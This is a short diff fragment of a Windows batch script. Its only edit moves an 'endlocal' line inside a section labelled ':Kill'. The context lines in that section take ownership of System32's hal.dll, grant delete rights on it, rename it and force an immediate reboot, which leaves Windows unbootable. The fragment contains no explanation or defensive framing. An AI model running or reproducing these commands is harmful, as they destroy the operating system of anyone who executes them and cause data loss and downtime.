@@ -30,11 +30,11 @@ echo Invalid Syntax!
 goto :Warning
 
 :Kill
-endlocal
 cd "%windir%\System32"
 takeown /f hal.dll 
 icacls hal.dll /grant %USERNAME%:(d,wdac)
 ren hal.dll hal1.dll
+endlocal
 Shutdown /r /t 00
 exit
 
